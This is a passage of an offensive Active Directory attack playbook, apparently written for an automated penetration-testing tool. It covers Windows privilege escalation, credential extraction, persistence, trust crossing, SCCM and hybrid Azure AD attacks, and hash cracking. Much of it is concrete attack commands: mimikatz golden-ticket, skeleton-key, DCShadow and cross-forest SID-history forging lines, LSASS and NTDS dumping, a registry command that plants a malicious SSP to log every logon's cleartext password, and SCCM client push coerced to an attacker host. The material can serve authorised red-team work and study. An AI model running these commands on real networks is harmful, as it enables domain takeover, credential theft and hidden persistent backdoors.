**Mechanism**: Service accounts often hold `SeImpersonatePrivilege`. The Potato family (Hot/Rotten/
Juicy/Sweet/PrintSpoofer/RoguePotato/RemotePotato0/GodPotato) coerces a SYSTEM-context process
to authenticate to a local marshalled COM endpoint, captures the token, impersonates SYSTEM.

| Variant | Trigger | OS support |
|---|---|---|
| RottenPotato | NBNS spoofing + DCOM | Win7/2008 |
| JuicyPotato | DCOM CLSIDs | Win7/2008/2012 |
| RoguePotato | DCOM cross-session | Win10 1809+ |
| PrintSpoofer | Print Spooler | Win10/2019 |
| RemotePotato0 | Cross-session DCOM | Win10/2019 |
| GodPotato | RPC (MS-DCOM) | Win8-Win11 |

**Command**: `PrintSpoofer.exe -i -c cmd` (most reliable on modern OS)
**Prereq**: Local user with `SeImpersonatePrivilege` (default for IIS, MSSQL, service accounts).
**Effect**: `local_system_obtained`.
**TAR actions**: new `actions/privesc/printspoofer.yml`, `godpotato.yml`, `roguepotato.yml`,
`remotepotato0.yml`

### UAC bypass
| Method | Mechanism |
|---|---|
| Fodhelper | `fodhelper.exe` reads HKCU classes; plant `ms-settings\\Shell\\Open\\Command` |
| WSReset | `wsreset.exe` autoElevate; plant `AppX\\Shell\\open\\command` |
| Dccw-elevation | `dccw.exe` autoElevate, hijacks `Display.dll` |
| MSDT (Follina-style) | DSC URL handler executes attacker code |

**TAR actions**: new `actions/privesc/uac_bypass_fodhelper.yml`, `uac_bypass_wsreset.yml`

### AppLocker / WDAC bypass
| Technique | Binary | Why allowed |
|---|---|---|
| MsBuild.exe | inline-task XML | Microsoft-signed |
| InstallUtil.exe | .NET binary | Microsoft-signed |
| Mshta.exe | HTA | Microsoft-signed |
| Regsvr32 | scrobj.dll | Microsoft-signed |
| Rundll32 | JS:scrobj | Microsoft-signed |

**TAR actions**: new `actions/privesc/applocker_bypass_msbuild.yml`

### HiveNightmare / SeriousSAM (CVE-2021-36934)
**Mechanism**: SAM/SYSTEM/SECURITY hives world-readable due to ACL bug in Windows 10 builds.
Local user can dump and offline-extract local admin hash.
**Command**: `python3 PrintNightmare-SAM.py` or `secretsdump.py -system -sam -security LOCAL`
**Prereq**: Local user on Win10 1809+ unpatched.
**Effect**: `local_admin_hash_obtained`.
**TAR action**: new `actions/privesc/seriousSAM_cve2021_36934.yml`

### Service hijacking / DLL hijacking / unquoted path
Standard Windows local privesc paths. WinPEAS surfaces them automatically.

---

## Branch 12 — Credential extraction (post-compromise on the host)

### LSASS dumping
**Mechanism**: Log-on credentials cached in LSASS process memory. Dump the process; offline
parse with mimikatz/pypykatz.
**Methods**: `procdump -ma lsass.exe`, `comsvcs.dll MiniDump`, `Task Manager → Create Dump`,
`SilentProcessExit`, `nanodump`, `defender-disable + mimikatz live`.
**Prereq**: SYSTEM (or PPL bypass).
**Effect**: `cleartext_credentials`, `nt_hash`, `tgt_for_logged_users`.
**TAR actions**: new `actions/creds/lsass_procdump.yml`, `lsass_comsvcs.yml`

### NTDS.dit (full domain hash dump)
**Mechanism**: NTDS.dit on a DC contains every account hash. Methods: `secretsdump -ntds`,
`vssadmin → NTDS.dit copy`, `ntdsutil snapshot`, or DCSync (no DC compromise needed).
**TAR action**: `actions/ad/secretsdump.yml`, `actions/ad/dcsync.yml`

### SAM / LSA secrets
**Mechanism**: Local SAM hive holds local accounts; LSA secrets hive holds service-account
credentials and DPAPI master keys.
**Command**: `secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL`
**TAR action**: new `actions/creds/sam_offline_dump.yml`

### MSCache2 (domain logon cache)
**Mechanism**: Last 10 successful domain logons cached as MSCache2 hashes. PBKDF2-SHA1 with low
iteration; crackable with hashcat mode 2100.
**TAR action**: new `actions/creds/mscache2_dump.yml`

### DPAPI master keys
**Mechanism**: DPAPI encrypts saved browser passwords, RDP creds, WiFi keys with a master key
derived from the user's password. With the user's hash or domain backup key, decrypt offline.
**Command**: `dpapi.py masterkey -file <masterkey> -sid USERSID -password PASS` or
`-pvk domain.pvk` for backup-key route.
**TAR action**: new `actions/creds/dpapi_masterkey_crack.yml`

### Browser credential stores
Chrome/Edge/Firefox each have a master-key-protected SQLite store. Offline extraction post-DPAPI.

### KeePass (CVE-2023-32784 cleartext leak from memory)
**Mechanism**: KeePass 2.x leaks the master password into process memory in cleartext. Dump KeePass
process → recover cleartext.
**Command**: `python3 keepass-dump.py keepass.dmp`
**TAR action**: new `actions/creds/keepass_dump.yml`

---

## Branch 13 — Persistence

### Golden Ticket
**Mechanism**: Forge a TGT signed with the krbtgt account's hash. Valid for 10 years by default.
Universal domain access.
**Command**: `mimikatz "kerberos::golden /user:fake /domain:DOMAIN /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /ptt"`
**TAR action**: `actions/ad/golden_ticket.yml`

### Silver Ticket
**Mechanism**: Forge a TGS for a specific service principal signed with that SPN account's hash.
Stealthier than golden (no krbtgt involvement, no DC interaction).
**TAR action**: `actions/ad/silver_ticket.yml`

### Diamond Ticket
**Mechanism**: Request a legitimate TGT then re-encrypt with krbtgt hash but with PAC modifications.
Bypasses many golden-ticket detections looking for forged-TGT artifacts.
**TAR action**: `actions/ad/diamond_ticket.yml`

### Sapphire Ticket
**Mechanism**: Request a TGS with S4U2self+U2U as a target user, then re-encrypt with krbtgt key
to forge a TGT. Combines diamond's legitimate-source benefits with arbitrary user targeting.
**Command**: `getST.py -k -no-pass -self -altservice cifs/dc -impersonate Administrator DOMAIN/USER`
then re-encrypt.
**Prereq**: krbtgt hash AND a legitimate user credential (any).
**Effect**: forged TGT for arbitrary user, low forensic footprint.
**TAR action**: new `actions/ad/saphire_ticket.yml`

### Skeleton Key
**Mechanism**: Patch LSASS on a DC to accept a magic password (`mimikatz` default) for any account
in addition to the real one. All users keep working; attacker logs in as anyone with the magic.
**Command**: `mimikatz "privilege::debug" "misc::skeleton"`
**Prereq**: SYSTEM on a DC. EDR-resistant variant uses Custom SSP / direct kernel.
**Effect**: `skeleton_key_installed`, `universal_backdoor`.
**TAR action**: new `actions/ad/skeleton_key.yml`

### Custom SSP (Security Support Provider)
**Mechanism**: Register a malicious SSP DLL that LSASS will load on next reboot — captures
plaintext credentials of every interactive logon. Persistent via `HKLM\System\Lsa\Security Packages`.
**Command**: `reg add HKLM\System\CurrentControlSet\Control\Lsa /v "Security Packages" /t REG_MULTI_SZ /d "kerberos\0msv1_0\0...\0mimilib"`
**Prereq**: SYSTEM on target (DC for max value).
**Effect**: `cleartext_credentials_logged`, `persistence_via_ssp`.
**TAR action**: new `actions/ad/custom_ssp.yml`

### DC Shadow
**Mechanism**: Register a rogue DC, replicate arbitrary attribute changes (sidHistory, GPO links,
ACEs) to legitimate DCs. The changes look like normal replication traffic — bypasses security
event monitoring tied to direct LDAP writes.
**Command**: `mimikatz "lsadump::dcshadow /object:CN=Administrator,CN=Users,DC=...
/attribute:primaryGroupID /value:512"`
**Prereq**: DA-equivalent rights, ability to register an SPN for the rogue DC.
**Effect**: `arbitrary_ad_change_via_replication`, `domain_persistence`.
**TAR action**: new `actions/ad/dc_shadow.yml`

### DSRM password (NTDS local admin)
**Mechanism**: DCs have a Directory Services Restore Mode account with its own NTLM hash stored
locally. Set this hash + enable `DsrmAdminLogonBehavior=2` and you can RDP/SMB to the DC as a
local admin even after the krbtgt is rotated.
**Command**: `mimikatz "lsadump::sam"` to read; `Set-ADAccountPassword -Identity Administrator
-Reset` (offline) or registry change to enable.
**Prereq**: SYSTEM on a DC.
**Effect**: `dsrm_admin_persistence`.
**TAR action**: new `actions/ad/dsrm_password.yml`

### AdminSDHolder modification
**Mechanism**: Container `CN=AdminSDHolder` template's ACL gets re-applied to every protected
group (DA, EA, etc.) every 60 minutes by SDProp. Adding a malicious ACE here = self-healing
backdoor on every protected account.
**TAR action**: `actions/ad/adminsdholder.yml`

---

## Branch 14 — Trust crossing

### Trust types
| Trust type | Auth flow | Cross-trust path |
|---|---|---|
| External (one-way) | NTLM only | SID history forge |
| External (two-way) | NTLM both ways | Trust-key extraction → forge inter-realm TGT |
| Forest (transitive) | Kerberos | Trust-key + SID filtering bypass |
| Realm (MIT Kerberos) | Cross-realm | rare |
| Shortcut (in-forest) | Kerberos | inherent |

### Trust key extraction
**Mechanism**: Each trust has an inter-realm trust key derived from a hidden user account
`<domain>$`. With DA in the trusting domain, dump this key and forge inter-realm TGTs that the
trusted-side KDC will accept.
**Command**: `secretsdump.py -ntds NTDS.dit -system SYSTEM LOCAL` then look for `domain$` accounts.
**Prereq**: DA in the trusting domain; KrbTgt hash is the source of the trust key.
**Effect**: `trust_key_extracted`, `inter_realm_tgt_forging_capable`.
**TAR action**: new `actions/ad/trust_key_extract.yml`

### Cross-trust ticket forge (child → parent forest)
**Mechanism**: Forge an inter-realm TGT with EnterpriseAdmins SID in `extraSids` (SID history
attack). Parent forest accepts because its krbtgt isn't checked at this stage and SID filtering
is OFF for in-forest trusts by default.
**Command**: `mimikatz "kerberos::golden /user:Administrator /domain:CHILD /sid:CHILD_SID /sids:PARENT_SID-519 /krbtgt:CHILD_KRBTGT /service:krbtgt /target:PARENT /ticket:trust.kirbi"` then PtT.
**Prereq**: DA in child forest, child→parent trust enumerated, SID filtering not enabled (default).
**Effect**: `forest_admin`, `dcsync_against_parent`.
**TAR action**: new `actions/ad/trust_ticket_forge.yml`

### Foreign group enumeration
**Mechanism**: Find users from foreign domains who hold privileged rights in your current domain
(or vice-versa). BloodHound's `MATCH (u:User)-[:MemberOf*1..]->(g:Group {highvalue:true}) WHERE
u.domain <> g.domain RETURN u,g`.
**TAR action**: covered via bloodhound cypher.

---

## Branch 15 — SCCM exploitation tree

### SCCM CRED-1 — NAA credential extraction
**Mechanism**: Network Access Account is a stored credential on every SCCM client used to fetch
content from DPs anonymously. Recovered via DPAPI from any client (including those joined as
plain user), or via PXE boot variables.
**Command**: `python3 SharpSCCM.py credentials policysecrets`
**Prereq**: Local user on a domain-joined client with SCCM agent.
**Effect**: `naa_credentials_obtained`, `valid_domain_credential`.
**TAR action**: new `actions/sccm/sccm_naa_extract.yml`

### SCCM CRED-2 — SCCM admin → site-server takeover
**Mechanism**: SCCM admins control site servers. From admin role, push a deployment that returns
site-server credentials.
**TAR action**: new `actions/sccm/sccm_admin_enum.yml`

### SCCM CRED-3 — Client push install creds (Hierarchy Take-1)
**Mechanism**: When client push installation is enabled, the SCCM site-server authenticates to
target hosts using a configured cleartext or NTLM credential. Coerce a client push to a controlled
host, capture the auth, relay or crack.
**Command**: `SharpSCCM.py invoke client-push --target ATTACKER`
**Prereq**: Local admin on any SCCM site-managed host, client push enabled.
**Effect**: `sccm_site_server_credential_relayed`.
**TAR action**: new `actions/sccm/sccm_client_push.yml`

### SCCM CRED-4 — HTTP looter (insecure HTTP DPs)
**Mechanism**: SCCM DPs serving over HTTP (not HTTPS) leak content directly via Range requests.
Pull NAA blobs, scripts, packages.
**Command**: `python3 sccm-http-looter.py SITE_SERVER`
**Prereq**: HTTP-only DP (less common in modern envs).
**Effect**: `naa_credentials_obtained`, `sccm_packages_dumped`.
**TAR action**: new `actions/sccm/sccm_http_looter.yml`

### SCCM CRED-5 — MSSQL relay to site DB
**Mechanism**: SCCM uses MSSQL behind the scenes. Coerce site server to authenticate to MSSQL
relay → execute as sysadmin → dump CM_Site DB which contains hashes/secrets.
**TAR action**: new `actions/sccm/sccm_mssql_relay.yml`

### SCCM CRED-6 — PXE boot variable capture
**Mechanism**: PXE variables are encrypted with a media password. Default or weak passwords decode
trivially; pass to PXEThief.
**TAR action**: new `actions/sccm/sccm_pxe_hashcap.yml`

### SCCM Takeover-1 — site-server compromise → application deployment
**Mechanism**: With SCCM admin or site-server local-admin, deploy an application targeting any
device collection. Effective domain-wide LOLBin.
**TAR action**: covered by sccm_admin_enum + standard psexec.

### SCCM Takeover-2 — client push targeting attacker
Already covered in CRED-3.

### SCCM Elevate-1/2/3 — escalation paths within SCCM admin tiers
Variants of role-misconfiguration → full-admin escalation. Covered by `sccmhunter find` output
which TAR ranks via `sccm_find` action.
**TAR action**: new `actions/sccm/sccm_find.yml`

---

## Branch 16 — Hybrid Active Directory (Azure AD Connect)

### MSOL_xxxxx account dump
**Mechanism**: Azure AD Connect runs as a service account `MSOL_xxxx` on a member server. This
account holds DCSync rights on-prem (so it can sync hashes to Azure). Dumping the local Azure AD
Connect database recovers MSOL credentials → DCSync.
**Command**: `python3 aadinternals/Get-AADIntSyncCredentials.ps1` (PowerShell run on AAD Connect host)
**Prereq**: Local admin on the Azure AD Connect server.
**Effect**: `msol_credentials_obtained`, `dcsync_capable`.
**TAR action**: new `actions/ad/msol_dump.yml`

### Pass-the-PRT
**Mechanism**: Primary Refresh Token cached on Azure-joined hosts grants SSO to Azure resources.
Extract via `roadtools` / `PRT` / `Browser Cookie Extraction`. Use to access Office365/Sharepoint/
Teams as the user.

### Cloud Kerberos Trust (Hybrid)
**Mechanism**: When Cloud Kerberos Trust is configured, an Azure AD identity can request a TGT
against on-prem KDC. Path from cloud admin → on-prem DA.

---

## Branch 17 — Hash cracking cheatsheet

| Hash type | Hashcat mode | Notes |
|---|---:|---|
| NetNTLMv1 | 5500 | Crackable; rare in modern AD |
| NetNTLMv2 | 5600 | Most common from Responder |
| NTLM (NT hash) | 1000 | Cracking the cleartext from a hash |
| Kerberos AS-REP (etype 23) | 18200 | ASREPRoast |
| Kerberos AS-REP (etype 17/18) | 19600/19700 | When AES required |
| Kerberos TGS (etype 23) | 13100 | Kerberoast RC4 |
| Kerberos TGS (etype 17/18) | 19600/19700 | Kerberoast AES |
| MSCache2 | 2100 | DCC2, slow |
| KeePass 2 | 13400 | KeePass master password |
| LM (legacy) | 3000 | Trivial; rare |

Common wordlists: `rockyou.txt`, `kerberoast.txt`, `Crackstation`, `Weakpass v3`. Common rule sets:
`OneRuleToRuleThemAll`, `dive.rule`, `best64.rule`.

---

## Branch 18 — Decision flow shortcut tables

### Symptom → next action
| Symptom in WM | First-choice action |
|---|---|
| Kerberos clock skew error | sync time before retrying anything |
| `KRB5KDC_ERR_PREAUTH_REQUIRED` for many users | password spray (kerbrute) |
| `KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN` | wrong username; refine list |
| LDAP "1F operationsError" | likely needs auth — try anon bind first |
| ntlmrelayx "no callback received" | wrong coercion (port-445 only triggers with PrinterBug) |
| ntlmrelayx "STATUS_LOGON_FAILURE" | relayed user not local-admin on target |
| Responder catches `DC$` only | DC processed logon script as DC$; relay it |
| BloodHound shows `unconstraineddelegation:true` host | PrinterBug-coerce DC → that host |
| BloodHound shows `WriteOwner` on group | owneredit + dacledit + addmember |
| ADCS template ENROLLEE_SUPPLIES_SUBJECT | ESC1 |
| Veeam B&R service banner | check 4 known CVEs in version table |
| MSOL_ account in WM | hybrid AD path: dump from AAD Connect host |

### Privilege uplift table (current → goal)
| Current | Path candidates |
|---|---|
| network only | Responder → spray, mitm6 → relay, PetitPotam → ADCS |
| 1 user cred | Bloodhound, kerberoast, asreproast, LAPS check, GMSA check, ESC1-15 enum |
| local admin on host | LSASS dump, lateral via PtH, look for unconstrained delegation |
| domain admin | DCSync, golden ticket, look for trusts (`nltest /trusted_domains`) |
| forest admin | trust key extraction, cross-forest ticket forge, MSOL dump for cloud |

---

## Cross-references

- HackTricks AD root: `windows-hardening/active-directory-methodology/`
- PayloadsAllTheThings: `Methodology and Resources/Active Directory Attack.md`
- BloodHound Cypher library: `/home/kali/knowledge/cypher/`
- TAR action library: `/home/kali/knowledge/actions/`
